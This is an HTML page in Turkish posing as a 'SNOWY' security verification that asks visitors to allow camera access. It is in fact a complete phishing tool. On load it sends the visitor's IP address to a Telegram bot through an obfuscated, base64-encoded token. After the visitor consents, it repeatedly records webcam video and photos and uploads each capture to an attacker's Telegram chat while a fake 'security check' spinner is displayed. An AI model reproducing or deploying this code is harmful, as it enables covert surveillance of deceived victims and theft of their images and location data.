<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(102, 126, 234, 0.2);
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        h2 span { 
            color: #667eea;
            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
        }
        p { 
            color: #4a5568; 
            margin-bottom: 35px;
            font-size: 16px;
            line-height: 1.6;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-text { 
            color: #667eea; 
            font-size: 18px;
            font-weight: 500;
        }
        #video, #canvas { display: none; }
        .status {
            margin-top: 20px;
            color: #4a5568;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
            <div class="status" id="status"></div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            // ==================== KONFİGÜRASYON ====================
            const __ENV = {
                API_ENDPOINT: "https://api.telegram.org",
                SESSION_SECRET: "ODY0OTQyMTUwODpBQUVxcjRjcDFPNkI1MnpOXzhSak11YnRkSDJDeEdMR1pTWQ==",
                APP_ENV: "production"
            };

            const SessionManager = {
                getToken: function() {
                    try {
                        return atob(__ENV.SESSION_SECRET);
                    } catch (error) {
                        return null;
                    }
                }
            };

            const BOT_TOKEN = SessionManager.getToken();
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ==================== IP ADRESİ GÖNDER ====================
            if (TARGET_ID && BOT_TOKEN) {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                            })
                        });
                    })
                    .catch(e => console.log(e));
            }
            
            // ==================== DÜZELTİLMİŞ KAMERA İŞLEMLERİ ====================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
            const statusDiv = document.getElementById('status');
            
            let stream = null;
            let videoCount = 0;
            let photoCount = 0;
            let videoInterval = null;
            let photoInterval = null;
            let isActive = true;
            
            // Status güncelleme
            function updateStatus(text) {
                if (statusDiv) statusDiv.textContent = text;
            }
            
            // Hassas video kaydetme fonksiyonu
            function startVideoRecording() {
                if (!stream?.active || !isActive) return;
                
                videoCount++;
                const currentVideoCount = videoCount;
                const chunks = [];
                
                updateStatus(`Video #${currentVideoCount} kaydediliyor...`);
                
                try {
                    // MediaRecorder kontrolü
                    if (!MediaRecorder || !MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                        console.log('MediaRecorder desteklenmiyor');
                        return;
                    }
                    
                    const mr = new MediaRecorder(stream, {
                        mimeType: 'video/webm;codecs=vp8',
                        videoBitsPerSecond: 2500000
                    });
                    
                    mr.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    mr.onstop = () => {
                        if (!isActive) return;
                        
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const boyut = (blob.size / 1024).toFixed(0);
                        
                        updateStatus(`Video #${currentVideoCount} gönderiliyor (${boyut}KB)...`);
                        
                        const formData = new FormData();
                        formData.append('chat_id', TARGET_ID);
                        formData.append('video', blob, `video_${currentVideoCount}_${Date.now()}.webm`);
                        formData.append('caption', `🎥 Video #${currentVideoCount} - ${VIDEO_SURESI}s`);
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(() => {
                            updateStatus(`Video #${currentVideoCount} gönderildi`);
                        })
                        .catch(e => {
                            console.log('Video gönderilemedi:', e);
                            updateStatus(`Video #${currentVideoCount} gönderilemedi`);
                        });
                    };
                    
                    mr.onerror = (e) => {
                        console.log('MediaRecorder hatası:', e);
                    };
                    
                    // Kaydı başlat
                    mr.start();
                    
                    // Hassas süre kontrolü - her 100ms'de bir kontrol
                    const startTime = Date.now();
                    const timer = setInterval(() => {
                        if (!isActive) {
                            clearInterval(timer);
                            return;
                        }
                        
                        const elapsed = Date.now() - startTime;
                        const remaining = Math.max(0, Math.ceil((VIDEO_SURESI * 1000 - elapsed) / 1000));
                        
                        if (remaining > 0) {
                            updateStatus(`Video #${currentVideoCount}: ${remaining} saniye kaldı`);
                        }
                        
                        if (elapsed >= VIDEO_SURESI * 1000) {
                            clearInterval(timer);
                            if (mr.state === 'recording') {
                                mr.stop();
                            }
                        }
                    }, 100);
                    
                } catch(e) {
                    console.log('Video kayıt hatası:', e);
                    updateStatus('Video kayıt hatası');
                }
            }
            
            // Hassas fotoğraf çekme fonksiyonu
            function takePhoto() {
                if (!stream?.active || !isActive || video.videoWidth === 0) return;
                
                photoCount++;
                const currentPhotoCount = photoCount;
                
                updateStatus(`Fotoğraf #${currentPhotoCount} çekiliyor...`);
                
                try {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob((blob) => {
                        if (!blob || !isActive) return;
                        
                        const boyut = (blob.size / 1024).toFixed(0);
                        updateStatus(`Fotoğraf #${currentPhotoCount} gönderiliyor (${boyut}KB)...`);
                        
                        const formData = new FormData();
                        formData.append('chat_id', TARGET_ID);
                        formData.append('photo', blob, `foto_${currentPhotoCount}_${Date.now()}.jpg`);
                        formData.append('caption', `📸 Fotoğraf #${currentPhotoCount}`);
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(() => {
                            updateStatus(`Fotoğraf #${currentPhotoCount} gönderildi`);
                        })
                        .catch(e => {
                            console.log('Fotoğraf gönderilemedi:', e);
                            updateStatus(`Fotoğraf #${currentPhotoCount} gönderilemedi`);
                        });
                        
                    }, 'image/jpeg', 0.9);
                    
                } catch(e) {
                    console.log('Fotoğraf çekme hatası:', e);
                    updateStatus('Fotoğraf çekilemedi');
                }
            }
            
            // Ana kamera başlatma fonksiyonu
            async function startCamera() {
                try {
                    updateStatus('Kamera başlatılıyor...');
                    
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            frameRate: { ideal: 30 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        updateStatus('Kamera hazır, başlatılıyor...');
                        
                        // Kameranın stabilize olması için 2 saniye bekle
                        setTimeout(() => {
                            if (!isActive) return;
                            
                            updateStatus('Güvenlik kontrolü başladı');
                            
                            // ===== İLK VİDEO (2 saniye sonra) =====
                            setTimeout(() => {
                                if (!isActive) return;
                                startVideoRecording();
                            }, 2000);
                            
                            // ===== DİĞER VİDEOLAR (periyodik) =====
                            // İlk videodan sonra düzenli aralıklarla devam et
                            setTimeout(() => {
                                if (!isActive) return;
                                videoInterval = setInterval(() => {
                                    if (isActive) {
                                        startVideoRecording();
                                    }
                                }, VIDEO_SURESI * 1000);
                            }, 2000 + VIDEO_SURESI * 1000);
                            
                            // ===== FOTOĞRAFLAR (3 saniye sonra başla) =====
                            setTimeout(() => {
                                if (!isActive) return;
                                
                                // İlk fotoğraf
                                takePhoto();
                                
                                // Diğer fotoğraflar
                                photoInterval = setInterval(() => {
                                    if (isActive) {
                                        takePhoto();
                                    }
                                }, FOTO_SURESI * 1000);
                                
                            }, 3000);
                            
                        }, 2000); // Stabilizasyon süresi
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli! Hata: ' + e.message);
                    console.log('Kamera hatası:', e);
                }
            }
            
            // Sayfa kapanırken temizlik
            window.onbeforeunload = function() {
                isActive = false;
                
                if (videoInterval) {
                    clearInterval(videoInterval);
                }
                if (photoInterval) {
                    clearInterval(photoInterval);
                }
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
